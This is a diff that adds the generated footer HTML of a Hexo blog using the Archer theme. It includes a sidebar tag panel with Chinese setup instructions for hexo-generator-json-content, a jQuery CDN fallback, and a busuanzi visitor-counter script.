+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
